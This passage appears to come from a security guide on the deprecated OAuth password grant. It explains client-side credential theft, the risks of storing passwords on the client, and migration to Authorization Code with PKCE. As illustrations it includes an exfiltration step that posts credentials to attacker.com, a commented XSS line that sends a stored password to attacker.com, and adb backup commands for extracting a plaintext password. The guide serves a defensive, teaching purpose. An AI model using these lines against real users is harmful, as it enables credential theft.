- Client-side malware (logs password)
- Network inspection tools on user's device
- Compromised system libraries

#### Attack Sequence

```
1. User device compromised:
   - Malware installed
   - Certificate pinning bypassed
   - SSL inspection enabled
   - Debugging tools active

2. User enters password in app:
   Username: alice@example.com
   Password: SecretPassword123!
   
   Malware watches memory/keyboard

3. Password captured BEFORE HTTPS:
   Client app code:
   const password = getUserInput();  <- Malware reads this
   
   sendToServer(password);  <- HTTPS doesn't help, already captured

4. Malware exfiltrates credentials:
   POST https://attacker.com/capture
   { username, password }

5. Even with HTTPS:
   - Client sees plaintext password
   - Client memory can be read
   - Client network calls can be intercepted
   - SSL/TLS only protects in-transit
```

#### Exploit Demonstration (Vulnerable Mode: `HTTP_TOKEN_ENDPOINT`)

```javascript
// Tool demonstrates: MITM and client-side capture

// Scenario 1: HTTP endpoint (obviously bad)
async function authenticateInsecure(username, password) {
  // **DANGER:** HTTP, not HTTPS
  const response = await fetch('http://auth.example.com/token', {
    method: 'POST',
    body: new URLSearchParams({
      grant_type: 'password',
      username: username,  // Plaintext over network
      password: password   // Plaintext over network
    })
  });
  
  return await response.json();
}

// Network attacker sees:
// POST http://auth.example.com/token
// grant_type=password&username=alice@example.com&password=SecretPassword123!

// Scenario 2: HTTPS but client-side capture
async function authenticateWithClientMalware(username, password) {
  // Malware hook: Intercept before HTTPS
  if (window.malware) {
    window.malware.logCredentials(username, password);
  }
  
  // HTTPS protects in transit, but malware already has credentials
  const response = await fetch('https://auth.example.com/token', {
    method: 'POST',
    body: new URLSearchParams({
      grant_type: 'password',
      username: username,
      password: password
    })
  });
  
  return await response.json();
}

// Scenario 3: Memory inspection
class ClientApp {
  async authenticate(username, password) {
    // Password exists in memory
    this.credentials = { username, password };  // Malware can read
    
    // Even if we delete immediately
    const response = await this.sendRequest();
    delete this.credentials;
    
    // Password still in memory (not securely wiped)
    // Memory forensics can recover
  }
}
```

#### Why HTTPS Isn't Enough

**HTTPS protects:** Network transmission

**HTTPS doesn't protect:**
- Password entry on user's device
- Password in client application memory
- Password in client application code
- Client-side malware
- Compromised client application
- User's device security

**With Authorization Code + PKCE:**
- Password entered in browser (better security boundary)
- Password never in client application
- Client never handles credentials
- Smaller attack surface

### 7.5 Password Storage in Client

#### Attack Description

Developers store passwords in client applications for "convenience" (remember me, auto-login).

**Why this happens:**
- Users want seamless experience
- Developers don't want to implement proper token refresh
- "It's encrypted!" (with key stored with encrypted data)
- "It's just for convenience!" (still catastrophically dangerous)

#### Common Storage Patterns (All Bad)

```javascript
// **DANGER PATTERN 1:** Plaintext storage
localStorage.setItem('username', 'alice@example.com');
localStorage.setItem('password', 'SecretPassword123!');  // DISASTER

// **DANGER PATTERN 2:** Base64 "encoding" (not encryption)
const encoded = btoa('SecretPassword123!');
localStorage.setItem('password', encoded);  // STILL DISASTER

// **DANGER PATTERN 3:** "Encrypted" with client-side key
const encrypted = encrypt('SecretPassword123!', 'hardcodedkey123');
localStorage.setItem('password', encrypted);  // DISASTER
// (Key is in client code, easily extracted)

// **DANGER PATTERN 4:** Mobile app storage
// iOS
UserDefaults.standard.set("SecretPassword123!", forKey: "password")  // DISASTER

// Android
sharedPrefs.edit()
  .putString("password", "SecretPassword123!")
  .apply();  // DISASTER

// **CORRECT PATTERN:** Store refresh token, NOT password
const tokens = await authenticate(username, password);
secureStorage.setItem('refresh_token', tokens.refresh_token);  // OK
// Never store password!
```

#### Attack Sequence

```
1. User uses app with "remember me":
   App stores password in storage

2. Time passes (days, weeks, months)

3. One of these happens:
   a) Device stolen/lost
   b) Malware installed
   c) Backup compromised
   d) Cloud sync compromised
   e) Debugging tools used
   f) App vulnerability exploited

4. Attacker gains access to storage:
   Extracts stored password

5. Attacker uses password:
   - Login to victim's account
   - Access other services (if password reused)
   - Change account settings
   - Lock out victim

6. Password theft goes unnoticed:
   - App still works normally
   - User doesn't know password was stolen
   - Attacker has persistent access
```

#### Exploit Demonstration (Vulnerable Mode: `CLIENT_STORES_PASSWORD`)

```javascript
// Tool demonstrates: Password storage vulnerability

// Scenario 1: Web app with localStorage
class InsecureWebApp {
  async login(username, password) {
    // Authenticate
    const tokens = await this.getTokens(username, password);
    
    // **DANGER:** Store credentials for "convenience"
    localStorage.setItem('stored_username', username);
    localStorage.setItem('stored_password', password);
    localStorage.setItem('access_token', tokens.access_token);
    
    return tokens;
  }
  
  async autoLogin() {
    // "Convenient" auto-login
    const username = localStorage.getItem('stored_username');
    const password = localStorage.getItem('stored_password');
    
    if (username && password) {
      return await this.login(username, password);
    }
  }
  
  // Attack: XSS steals password
  // Malicious script:
  // const password = localStorage.getItem('stored_password');
  // fetch('https://attacker.com/steal?p=' + password);
}

// Scenario 2: Mobile app with SharedPreferences (Android)
// Java/Kotlin
class InsecureMobileApp {
    fun saveCredentials(username: String, password: String) {
        val sharedPrefs = context.getSharedPreferences("auth", Context.MODE_PRIVATE)
        sharedPrefs.edit()
            .putString("username", username)
            .putString("password", password)  // DANGER: Plaintext password
            .apply()
    }
    
    fun autoLogin() {
        val sharedPrefs = context.getSharedPreferences("auth", Context.MODE_PRIVATE)
        val username = sharedPrefs.getString("username", null)
        val password = sharedPrefs.getString("password", null)
        
        if (username != null && password != null) {
            authenticate(username, password)
        }
    }
    
    // Attack: Rooted device + adb backup
    // $ adb backup -f backup.ab com.example.app
    // $ dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
    // $ tar xf backup.tar
    // $ cat apps/com.example.app/sp/auth.xml
    // Result: Plaintext password extracted
}

// Scenario 3: "Encrypted" storage (still broken)
class FalseSecurityApp {
  encryptPassword(password) {
    // "Encryption" with hardcoded key
    const key = 'MySecretKey123';  // In source code!
    return CryptoJS.AES.encrypt(password, key).toString();
  }
  
  decryptPassword(encrypted) {
    const key = 'MySecretKey123';  // Easily extracted
    return CryptoJS.AES.decrypt(encrypted, key).toString(CryptoJS.enc.Utf8);
  }
  
  savePassword(password) {
    const encrypted = this.encryptPassword(password);
    localStorage.setItem('enc_password', encrypted);
    // Attacker extracts key from source code
    // Decrypts password
    // Still compromised!
  }
}

// Correct approach: Store refresh token, NOT password
class SecureApp {
  async login(username, password) {
    // Authenticate
    const tokens = await this.getTokens(username, password);
    
    // Store ONLY refresh token in secure storage
    await SecureStorage.setItem('refresh_token', tokens.refresh_token);
    // DO NOT store password!
    
    return tokens;
  }
  
  async refreshSession() {
    // Use refresh token to get new access token
    const refreshToken = await SecureStorage.getItem('refresh_token');
    const newTokens = await this.refreshAccessToken(refreshToken);
    return newTokens;
  }
}
```

---

## 8. Limited Legitimate Use Cases (Extremely Rare)

### **WARNING:** Even "legitimate" use cases should reconsider

The OAuth 2.0 specification (RFC 6749) acknowledges the password grant exists but provides strict conditions:

**Per RFC 6749 §4.3:**
> "This grant type is suitable for clients capable of obtaining the resource owner's credentials (username and password, typically using an interactive form). It is also used to migrate existing clients using direct authentication schemes such as HTTP Basic or Digest authentication to OAuth by converting the stored credentials to an access token."

### 8.1 First-Party Applications Only

**Definition:** Client and authorization server operated by same organization.

**Example scenarios:**
```
Legitimate (but still discouraged):
* Bank's own mobile app ← → Bank's authentication server
* Company's internal app ← → Company's identity provider
* Service's native client ← → Service's API

NOT legitimate:
* Third-party app ← → Any auth server
* Multi-tenant app ← → Customer's auth server
```

**Why first-party only:**
- Reduced (but not eliminated) risk of credential theft
- Same organization controls client and server
- Single security boundary

**Why still problematic even for first-party:**
```
Scenario: Bank's Mobile App

Security issues remain:
1. App compromise → credentials exposed
2. Malware on user device → credentials captured
3. Phishing training → users enter bank password in apps
4. MFA limitations → cannot use standard MFA
5. Password changes → all devices break
6. Developer mistake → credentials logged

Better approach:
Bank app uses Authorization Code + PKCE:
* App redirects to bank.com in browser
* User sees bank.com domain
* Bank handles MFA properly
* App never sees password
* Standard OAuth security model
```

### 8.2 Migration from Legacy Authentication

**Scenario:** Existing system uses HTTP Basic or Digest authentication, migrating to OAuth.

**Temporary bridge approach:**
```
Phase 1 (Current): HTTP Basic Auth
App -> HTTP Basic -> API
Problem: Password in every request

Phase 2 (Migration): Password Grant
App -> Password Grant -> Token -> API
Slight improvement: Token instead of password in API requests

Phase 3 (Target): Authorization Code + PKCE
App -> Browser Auth -> Token -> API
Proper OAuth: No credentials in app
```

**Critical requirements for migration use:**
1. **Temporary only** - Must have defined timeline to Phase 3
2. **First-party only** - Same organization
3. **Documented plan** - Written migration timeline
4. **Security controls** - Rate limiting, monitoring, logging
5. **User communication** - Warn users about upcoming changes

**Example migration timeline:**
```
Month 1-2: Implement password grant
           Deploy to staging
           Monitor for issues

Month 3-4: Deploy to production
           Communicate migration plan to users

Month 5-6: Implement proper OAuth (Auth Code + PKCE)
           Deploy new version

Month 7-8: Migrate users to new version
           Support both flows temporarily

Month 9: Deprecate password grant
         Force update to new version

Month 10: REMOVE password grant completely
```

### 8.3 Why Even "Legitimate" Cases Should Reconsider

**Common arguments for password grant:**

| Argument | Why It's Wrong |
|----------|---------------|
| "It's our own app, we're trustworthy" | Trust doesn't prevent compromise or developer mistakes |
| "Users prefer not redirecting to browser" | UX preference doesn't justify security risk |
| "We have tight security controls" | Controls don't address fundamental credential exposure |
| "Authorization Code is too complex" | Complexity is manageable; security is not negotiable |
| "We need offline access" | Use refresh tokens from auth code flow |
| "Our users are sophisticated" | Even experts make mistakes; attacks don't discriminate |

**Better alternatives exist for ALL scenarios:**

| Scenario | Instead of Password Grant | Why Better |
|----------|-------------------------|------------|
| Mobile app | Authorization Code + PKCE | No credentials in app, supports MFA |
| Desktop app | Authorization Code + PKCE + localhost redirect | Standard OAuth, secure |
| Command-line tool | Device Authorization Flow | User-friendly, no credential sharing |
| First-party web | Authorization Code + PKCE | Proper OAuth, supports all features |
| Machine-to-machine | Client Credentials (no user involved) | Appropriate for service accounts |
| Legacy migration | Accelerated migration to proper OAuth | Long-term security, not temporary band-aid |

---

## 9. Migration Paths

### **MANDATORY:** All password grant implementations MUST migrate

### 9.1 Migration to Authorization Code + PKCE (Preferred)

**Target:** Full OAuth 2.0 / OAuth 2.1 compliant flow with optimal security.

#### Migration Steps

**Step 1: Implement PKCE support**

```javascript
// Add PKCE generation to client
function generateCodeVerifier() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return base64URLEncode(array);
}

async function generateCodeChallenge(verifier) {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return base64URLEncode(new Uint8Array(hash));
}
```

**Step 2: Update authorization flow**

```javascript
// BEFORE: Password Grant
async function loginOld(username, password) {
  const response = await fetch(tokenEndpoint, {
    method: 'POST',
    body: new URLSearchParams({
      grant_type: 'password',
      username: username,        // ❌ Client sees password
      password: password,        // ❌ Client sees password
      client_id: clientId
    })
  });
  return await response.json();
}

// AFTER: Authorization Code + PKCE
async function loginNew() {
  // Generate PKCE
  const codeVerifier = generateCodeVerifier();
  const codeChallenge = await generateCodeChallenge(codeVerifier);
  
  // Store verifier for later
  sessionStorage.setItem('code_verifier', codeVerifier);
  
  // Redirect to authorization endpoint
  const authUrl = new URL(authorizationEndpoint);
  authUrl.searchParams.set('response_type', 'code');
  authUrl.searchParams.set('client_id', clientId);
  authUrl.searchParams.set('redirect_uri', redirectUri);
  authUrl.searchParams.set('code_challenge', codeChallenge);
  authUrl.searchParams.set('code_challenge_method', 'S256');
  authUrl.searchParams.set('scope', 'profile email');
  
  // User authenticates in browser (✓ Never sees password in app)
  window.location = authUrl.toString();
}

// Handle callback
async function handleCallback(code) {
  const codeVerifier = sessionStorage.getItem('code_verifier');
  
  // Exchange code for tokens
  const response = await fetch(tokenEndpoint, {
    method: 'POST',
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      client_id: clientId,
      redirect_uri: redirectUri,
      code_verifier: codeVerifier  // ✓ PKCE proof
    })
  });
  
  return await response.json();
}
```

**Step 3: Update server to support authorization code flow**

```javascript
// Server-side: Authorization endpoint
app.get('/authorize', (req, res) => {
  const {
    response_type,
    client_id,
    redirect_uri,
    code_challenge,
    code_challenge_method,
    scope
  } = req.query;
  
  // Validate PKCE
  if (!code_challenge || code_challenge_method !== 'S256') {
    return res.status(400).json({
      error: 'invalid_request',
      error_description: 'PKCE required'
    });
  }
  
  // Show authentication UI
  // User enters credentials HERE (in auth server UI, not client)
  // After authentication, show consent screen
  // Generate authorization code
  // Redirect back to client
});

// Server-side: Token endpoint with code exchange
app.post('/token', async (req, res) => {
  if (req.body.grant_type === 'authorization_code') {
    // Validate PKCE
    const storedChallenge = await getStoredChallenge(req.body.code);
    const computedChallenge = sha256(req.body.code_verifier);
    
    if (computedChallenge !== storedChallenge) {
      return res.status(400).json({
        error: 'invalid_grant',
        error_description: 'PKCE verification failed'
      });
    }
    
    // Issue tokens
    return res.json({
      access_token: generateAccessToken(),
      refresh_token: generateRefreshToken(),
      expires_in: 3600
    });
  }
});
```

**Step 4: Gradual migration**

```javascript
// Support both flows during migration
async function authenticate() {
  // Check if user has migrated
  const usesNewFlow = await checkUserMigrationStatus();
  
  if (usesNewFlow || NEW_FLOW_ENABLED) {
    // Use Authorization Code + PKCE
    return await loginWithAuthCode();
  } else {
    // Legacy: Password Grant (temporary)
    return await loginWithPassword();
  }
}

// Force migration after deadline
const MIGRATION_DEADLINE = new Date('2025-12-31');
if (Date.now() > MIGRATION_DEADLINE) {
  // Only auth code flow allowed
  return await loginWithAuthCode();
}
```

#### Benefits After Migration

| Aspect | Password Grant | Auth Code + PKCE | Improvement |
|--------|---------------|------------------|-------------|
| Credentials to client | YES | NO | ✅ Fundamental security improvement |
| Consent screen | NO | YES | ✅ User control over permissions |
| MFA support | Difficult | Native | ✅ Modern security |
| Federated identity | NO | YES | ✅ SSO, social login supported |
| Phishing resistance | LOW | HIGH | ✅ User sees auth server domain |
| Password changes | Break all clients | Graceful handling | ✅ Better UX |

### 9.2 Migration to Client Credentials (Machine-to-Machine)

**When appropriate:** No user involved, service-to-service authentication.

```javascript
// BEFORE: Password Grant (misused for service accounts)
async function authenticateService() {
  // ❌ WRONG: Using user credentials for service
  const response = await fetch(tokenEndpoint, {
    method: 'POST',
    body: new URLSearchParams({
      grant_type: 'password',
      username: 'service-account@example.com',  // Not a real user
      password: 'service-password-123',          // Service credential
      client_id: 'backend-service'
    })
  });
}

// AFTER: Client Credentials (correct for M2M)
async function authenticateService() {
  // ✓ CORRECT: Client credentials for service
  const response = await fetch(tokenEndpoint, {
    method: 'POST',
    headers: {
      'Authorization': 'Basic ' + btoa(clientId + ':' + clientSecret)
    },
    body: new URLSearchParams({
      grant_type: 'client_credentials',  // Proper M2M flow
      scope: 'api.read api.write'
    })
  });
}
```

**Benefits:**
- No fake user accounts
- Proper service authentication
- Scope tied to service, not user
- Clear audit trail of service actions

### 9.3 Migration to Device Flow (UI-Constrained Devices)

**When appropriate:** Smart TVs, CLI tools, IoT devices without easy text input.

```javascript
// BEFORE: Password Grant (bad UX on constrained devices)
// User struggles to type password with TV remote
async function authenticateTV(username, password) {
  const response = await fetch(tokenEndpoint, {
    method: 'POST',
    body: new URLSearchParams({
      grant_type: 'password',
      username: username,  // Hard to type with remote
      password: password,  // Hard to type with remote
      client_id: 'smart-tv-app'
    })
  });
}

// AFTER: Device Authorization Flow
async function authenticateTV() {
  // Step 1: Get device code
  const deviceAuth = await fetch(deviceAuthorizationEndpoint, {
    method: 'POST',
    body: new URLSearchParams({
      client_id: 'smart-tv-app',
      scope: 'streaming'
    })
  });
  
  const { device_code, user_code, verification_uri } = await deviceAuth.json();
  
  // Step 2: Display code to user
  displayOnTV(`
    Go to: ${verification_uri}
    Enter code: ${user_code}
  `);
  
  // Step 3: Poll for authorization
  while (true) {
    await sleep(5000);
    
    const tokenResponse = await fetch(tokenEndpoint, {
      method: 'POST',
      body: new URLSearchParams({
        grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
        device_code: device_code,
        client_id: 'smart-tv-app'
      })
    });
    
    if (tokenResponse.ok) {
      return await tokenResponse.json();
    }
  }
}
```

**Benefits:**
- No password entry on device
- User authenticates on phone/computer
- Better UX for constrained input
- Supports MFA, federated identity

### 9.4 Migration Timeline Template

```
MIGRATION PROJECT: Password Grant → Authorization Code + PKCE
================================================================

PHASE 1: PREPARATION (Weeks 1-4)
- [ ] Audit all password grant usage
- [ ] Identify affected systems
- [ ] Design auth code flow architecture
- [ ] Plan user communication
- [ ] Set migration deadline

PHASE 2: IMPLEMENTATION (Weeks 5-12)
- [ ] Implement authorization endpoint
- [ ] Implement PKCE support
- [ ] Update client applications
- [ ] Add consent screens
- [ ] Implement token refresh
- [ ] Test thoroughly

PHASE 3: DEPLOYMENT (Weeks 13-16)
- [ ] Deploy to staging
- [ ] User acceptance testing
- [ ] Fix issues
- [ ] Deploy to production
- [ ] Support both flows temporarily

PHASE 4: MIGRATION (Weeks 17-24)
- [ ] Communicate changes to users
- [ ] Migrate users gradually
- [ ] Monitor for issues
- [ ] Force update for holdouts
- [ ] Increase auth code adoption

PHASE 5: DEPRECATION (Weeks 25-28)
- [ ] Announce password grant sunset
- [ ] Display warnings in old clients
- [ ] Set final deadline
- [ ] Force migration of remaining users

PHASE 6: REMOVAL (Week 29+)
- [ ] Disable password grant endpoint
- [ ] Remove legacy code
- [ ] Document completion
- [ ] Post-migration review

TOTAL TIMELINE: 6-7 months
HARD DEADLINE: [Set specific date]
```

---

## 10. Implementation Requirements (If Forced to Support Legacy)

### **CRITICAL:** These are INSUFFICIENT mitigations. Migration is MANDATORY.

### 10.1 MUST NOT Implement in New Applications

**This cannot be stated strongly enough:**

```
IF (application == NEW):
    DO NOT implement password grant
    DO use Authorization Code + PKCE
    
IF (application == LEGACY):
    DO plan immediate migration
    DO implement security controls
    DO NOT expand password grant usage
    DO NOT justify password grant as acceptable
```

### 10.2 Legacy Support Requirements

If you are temporarily maintaining password grant while migrating:

#### Authorization Server MUST Implement

| # | Requirement | Spec Reference | Rationale |
|---|-------------|----------------|-----------|
| AS1 | Restrict to whitelisted first-party clients ONLY | Security BCP §2.4 | Prevent third-party credential harvesting |
| AS2 | Require client authentication for ALL clients | RFC 6749 §3.2.1 | Verify client identity |
| AS3 | Implement aggressive rate limiting (max 3 attempts/min/IP) | Security best practice | Prevent credential stuffing |
| AS4 | Log ALL password grant attempts with full context | Security best practice | Audit trail for security events |
| AS5 | Enforce maximum access token lifetime (5-15 minutes) | Security best practice | Minimize token abuse window |
| AS6 | Require TLS 1.3+ for token endpoint | RFC 6749 §3.2 | Secure credential transmission |
| AS7 | Implement account lockout after failed attempts | Security best practice | Prevent brute force |
| AS8 | Return generic error messages (don't reveal if username exists) | Security best practice | Prevent user enumeration |
| AS9 | Monitor for suspicious patterns (velocity, geolocation) | Security best practice | Detect compromised credentials |
| AS10 | Display deprecation headers in all responses | Communication | Inform developers |

#### Example Server-Side Implementation

```javascript
// Authorization server with password grant restrictions
const PASSWORD_GRANT_WHITELIST = [
  'legacy-mobile-app-v1',
  'legacy-desktop-client'
  // DO NOT ADD NEW CLIENTS
];

const rateLimiter = new Map();  // IP -> attempts
const failedAttempts = new Map();  // username -> count

app.post('/token', async (req, res) => {
  const { grant_type, username, password, client_id } = req.body;
  
  if (grant_type === 'password') {
    // Deprecation warning
    res.setHeader('X-OAuth-Deprecation', 
      'Password grant deprecated. Migrate to authorization_code by 2025-12-31');
    res.setHeader('X-OAuth-Migration-Guide', 
      'https://docs.example.com/oauth-migration');
    
    // AS1: Whitelist check
    if (!PASSWORD_GRANT_WHITELIST.includes(client_id)) {
      return res.status(400).json({
        error: 'unauthorized_client',
        error_description: 'This client is not authorized for password grant. Use authorization_code flow.'
      });
    }
    
    // AS2: Client authentication required
    const clientAuth = req.headers['authorization'];
    if (!clientAuth || !validateClientAuth(clientAuth, client_id)) {
      return res.status(401).json({
        error: 'invalid_client',
        error_description: 'Client authentication required'
      });
    }
    
    // AS3: Rate limiting
    const clientIP = req.ip;
    const attempts = rateLimiter.get(clientIP) || 0;
    if (attempts >= 3) {
      return res.status(429).json({
        error: 'too_many_requests',
        error_description: 'Too many authentication attempts. Try again in 1 minute.',
        retry_after: 60
      });
    }
    rateLimiter.set(clientIP, attempts + 1);
    setTimeout(() => {
      rateLimiter.set(clientIP, Math.max(0, rateLimiter.get(clientIP) - 1));
    }, 60000);
    
    // AS7: Account lockout
    const failed = failedAttempts.get(username) || 0;
    if (failed >= 5) {
      await lockAccount(username);
      return res.status(400).json({
        error: 'invalid_grant',
        error_description: 'Account temporarily locked due to failed attempts'
      });
    }
    
    // Validate credentials
    const user = await validateCredentials(username, password);
    
    if (!user) {
      // AS8: Generic error (don't reveal if username exists)
      failedAttempts.set(username, failed + 1);
      
      // AS4: Log failed attempt
      await logSecurityEvent({
        event: 'password_grant_failed',
        username: username,
        client_id: client_id,
        ip: clientIP,
        timestamp: new Date(),
        user_agent: req.headers['user-agent']
      });
      
      return res.status(400).json({
        error: 'invalid_grant',
        error_description: 'Invalid credentials'
      });
    }
    
    // Reset failed attempts
    failedAttempts.delete(username);
    
    // AS4: Log successful attempt
    await logSecurityEvent({
      event: 'password_grant_success',
      username: username,
      client_id: client_id,
      ip: clientIP,
      timestamp: new Date()
    });
    
    // AS9: Check for suspicious patterns
    const suspicious = await checkSuspiciousActivity(username, clientIP);
    if (suspicious) {
      await alertSecurityTeam({
        event: 'suspicious_password_grant',
        username: username,
        reason: suspicious.reason
      });
    }
    
    // AS5: Short token lifetime
    const accessToken = generateAccessToken(user, client_id, {
      expires_in: 300  // 5 minutes only
    });
    
    const refreshToken = generateRefreshToken(user, client_id);
    
    return res.json({
      access_token: accessToken,
      token_type: 'Bearer',
      expires_in: 300,  // 5 minutes
      refresh_token: refreshToken
    });
  }
  
  // Handle other grant types...
});
```

#### Client MUST Implement

| # | Requirement | Rationale |
|---|-------------|-----------|
| C1 | Display deprecation warning to developers | Communicate migration urgency |
| C2 | Never log or store passwords | Prevent credential exposure |
| C3 | Use TLS certificate pinning | Prevent MITM attacks |
| C4 | Implement secure memory handling | Prevent password extraction |
| C5 | Clear password from memory immediately after use | Minimize exposure window |
| C6 | Support migration to auth code flow | Enable users to upgrade |

#### Example Client-Side Implementation

```javascript
// Client with security controls
class PasswordGrantClient {
  constructor() {
    // C1: Display deprecation warning
    console.warn(
      '%c⚠️ DEPRECATION WARNING ⚠️',
      'font-size: 20px; color: red; font-weight: bold;'
    );
    console.warn(
      'This application uses the deprecated OAuth 2.0 Password Grant. ' +
      'This flow is insecure and will be removed on 2025-12-31. ' +
      'Please update to the latest version which uses secure OAuth flows.'
    );
  }
  
  async authenticate(username, password) {
    try {
      // Request tokens
      const response = await fetch(this.tokenEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Authorization': 'Basic ' + this.getClientAuth()
        },
        body: new URLSearchParams({
          grant_type: 'password',
          username: username,
          password: password
        })
      });
      
      // C4: Clear password from memory immediately
      username = null;
      password = null;
      
      if (!response.ok) {
        throw new Error('Authentication failed');
      }
      
      const tokens = await response.json();
      
      // C2: Store tokens, NOT password
      await this.secureStorage.setItem('access_token', tokens.access_token);
      await this.secureStorage.setItem('refresh_token', tokens.refresh_token);
      
      return tokens;
    } catch (error) {
      // C5: Ensure credentials cleared even on error
      username = null;
      password = null;
      throw error;
    }
  }
}
```

### 10.3 Monitoring and Alerting

```javascript
// Security monitoring for password grant usage
const monitoring = {
  // Track usage trends
  async trackUsage(event) {
    await metrics.increment('password_grant.usage', {
      client_id: event.client_id,
      success: event.success
    });
    
    // Alert if usage increasing (should be decreasing during migration)
    const recent = await metrics.get('password_grant.usage', { period: '1d' });
    const previous = await metrics.get('password_grant.usage', { period: '2d' });
    
    if (recent > previous * 1.1) {
      await alert({
        level: 'warning',
        message: 'Password grant usage increasing (should be decreasing)',
        usage: { recent, previous }
      });
    }
  },
  
  // Detect suspicious patterns
  async detectAnomalies(username, clientIP) {
    // Multiple clients from same IP
    const clientsFromIP = await db.query(
      'SELECT COUNT(DISTINCT client_id) FROM auth_attempts WHERE ip = ? AND timestamp > NOW() - INTERVAL 1 HOUR',
      [clientIP]
    );
    
    if (clientsFromIP > 3) {
      return { suspicious: true, reason: 'multiple_clients_from_ip' };
    }
    
    // Geographic anomaly
    const userLocation = await geolocate(clientIP);
    const lastLocation = await getLastKnownLocation(username);
    
    if (distance(userLocation, lastLocation) > 1000) {  // 1000 km
      return { suspicious: true, reason: 'geographic_anomaly' };
    }
    
    // Velocity check
    const lastLogin = await getLastLogin(username);
    if (Date.now() - lastLogin < 60000) {  // Less than 1 minute
      return { suspicious: true, reason: 'rapid_successive_attempts' };
    }
    
    return { suspicious: false };
  }
};
```

---

## 11. Validation Rules (Exact Spec Requirements)

### 11.1 Token Request Validation

```
FUNCTION validatePasswordGrantRequest(request):
    # RFC 6749 §4.3.2: grant_type MUST be "password"
    IF request.grant_type != "password":
        RETURN error("unsupported_grant_type")
    
    # RFC 6749 §4.3.2: username REQUIRED
    IF request.username IS empty:
        RETURN error("invalid_request", "username required")
    
    # RFC 6749 §4.3.2: password REQUIRED
    IF request.password IS empty:
        RETURN error("invalid_request", "password required")
    
    # RFC 6749 §3.2.1: Confidential clients MUST authenticate
    IF client_type(request.client_id) == "confidential":
        IF NOT authenticated(request):
            RETURN error("invalid_client", "Client authentication required")
    
    # Security BCP §2.4: Should restrict to whitelist
    IF request.client_id NOT IN password_grant_whitelist:
        RETURN error("unauthorized_client", 
                    "Password grant not allowed for this client")
    
    RETURN validation_passed
```

### 11.2 Credential Validation

```
FUNCTION validateUserCredentials(username, password):
    # Find user
    user = database.findUser(username)
    
    IF user IS null:
        # Security: Don't reveal if username exists
        RETURN error("invalid_grant", "Invalid credentials")
    
    # Check account status
    IF user.locked OR user.suspended:
        RETURN error("invalid_grant", "Account locked")
    
    # Verify password
    IF NOT verifyPassword(password, user.password_hash):
        # Increment failed attempts
        incrementFailedAttempts(username)
        
        # Check if should lock account
        IF getFailedAttempts(username) >= 5:
            lockAccount(username)
        
        RETURN error("invalid_grant", "Invalid credentials")
    
    # Reset failed attempts on success
    resetFailedAttempts(username)
    
    RETURN user
```

### 11.3 Rate Limiting Validation

```
FUNCTION checkRateLimit(clientIP, username):
    # Per-IP rate limit
    ipAttempts = getRateLimitCount(clientIP, window=60)
    IF ipAttempts >= 3:
        RETURN error("too_many_requests", 
                    "Rate limit exceeded. Try again in 1 minute")
    
    # Per-user rate limit
    userAttempts = getRateLimitCount(username, window=300)
    IF userAttempts >= 10:
        RETURN error("too_many_requests",
                    "Too many attempts for this account")
    
    # Global rate limit (prevent large-scale attacks)
    globalAttempts = getGlobalRateLimit(window=60)
    IF globalAttempts >= 100:
        RETURN error("service_unavailable",
                    "Service temporarily unavailable")
    
    RETURN rate_limit_ok
```

### 11.4 Validation Requirements Summary

| Rule | Requirement | Spec Reference |
|------|-------------|----------------|
| grant_type | MUST be `"password"` | RFC 6749 §4.3.2 |
| username | REQUIRED | RFC 6749 §4.3.2 |
| password | REQUIRED | RFC 6749 §4.3.2 |
| Client auth | REQUIRED for confidential clients | RFC 6749 §3.2.1 |
| TLS | Token endpoint MUST use TLS | RFC 6749 §3.2 |
| User auth | Server SHOULD authenticate user | RFC 6749 §4.3.2 |
| Whitelist | Server SHOULD restrict to approved clients | Security BCP §2.4 |
| Rate limiting | Server SHOULD implement rate limits | Security best practice |

---

## 12. Comparison with Proper OAuth Flows

| Property | Password Grant | Auth Code + PKCE | Client Credentials | Device Flow |
|----------|---------------|------------------|-------------------|-------------|
| **User credentials to client** | ✗ YES (BAD) | ✓ NO | ✓ N/A (no user) | ✓ NO |
| **OAuth 2.1 status** | ✗ REMOVED | ✓ REQUIRED | ✓ INCLUDED | ✓ INCLUDED |
| **Consent screen** | ✗ NO | ✓ YES | ✓ N/A | ✓ YES |
| **MFA support** | ✗ Difficult | ✓ Native | ✓ N/A | ✓ Native |
| **Federated identity** | ✗ NO | ✓ YES | ✓ N/A | ✓ YES |
| **Client trust required** | ✗ HIGH | ✓ LOW | ✓ HIGH | ✓ LOW |
| **Phishing resistance** | ✗ LOW | ✓ HIGH | ✓ N/A | ✓ MEDIUM |
| **Password changes** | ✗ Breaks clients | ✓ Graceful | ✓ N/A | ✓ Graceful |
| **Refresh tokens** | ⚠️ Possible | ✓ YES | ✗ NO | ✓ YES |
| **UI constraints** | ⚠️ Needs keyboard | ⚠️ Needs browser | ✓ None | ✓ Optimized for limited input |
| **Recommendation** | ✗ NEVER USE | ✓ PREFERRED | ✓ For M2M only | ✓ For constrained devices |

### Detailed Comparison: Password Grant vs Authorization Code + PKCE

```
┌─────────────────────────────────────────────────────────────────────┐
│ Security Properties Comparison                                      │
├───────────────────────┬─────────────────┬──────────────────────────┤
│ Property              │ Password Grant  │ Auth Code + PKCE         │
├───────────────────────┼─────────────────┼──────────────────────────┤
│ Credentials exposed   │ ✗ To client     │ ✓ Only to auth server    │
│ Phishing training     │ ✗ Trains users  │ ✓ Teaches verification   │
│ Credential theft      │ ✗ Possible      │ ✓ Protected              │
│ MFA compatibility     │ ✗ Difficult     │ ✓ Full support           │
│ SAML/SSO support      │ ✗ Cannot use    │ ✓ Full support           │
│ Social login          │ ✗ Cannot use    │ ✓ Full support           │
│ Passwordless auth     │ ✗ Cannot use    │ ✓ Full support           │
│ Token in URL          │ ✓ No            │ ✓ No                     │
│ Client authentication │ ⚠️ Optional     │ ✓ PKCE proves client     │
│ User consent          │ ✗ None          │ ✓ Explicit consent       │
└───────────────────────┴─────────────────┴──────────────────────────┘
```

---

## 13. Example Scenarios

### 13.1 Legacy Enterprise App Using Password Grant

**Scenario:** Internal CRM application using password grant since 2013.

#### Current Implementation

```javascript
// Legacy CRM app (circa 2013, still in use)
class LegacyCRMApp {
  async login(username, password) {
    // Password grant authentication
